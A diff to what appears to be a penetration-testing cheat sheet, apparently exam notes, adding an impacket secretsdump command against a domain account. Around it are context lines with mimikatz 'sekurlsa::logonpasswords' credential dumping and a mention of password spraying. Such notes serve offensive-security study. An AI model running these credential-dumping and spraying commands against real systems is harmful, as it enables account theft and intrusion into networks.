@@ -128,6 +128,11 @@ secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
 PS C:\tmp > mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > dumped_pwds.txt
 ```
 
+-Dump passwords using impacket (try all user accounts that are found using net user /domain)
+```bash
+impacket-secretdump exam.com/apachesvc@192.168.1xx.101
+```
+
 - Spray with known password on list of found usernames
 ```bash
 # Crackmapexec - check if the output shows 'Pwned!'
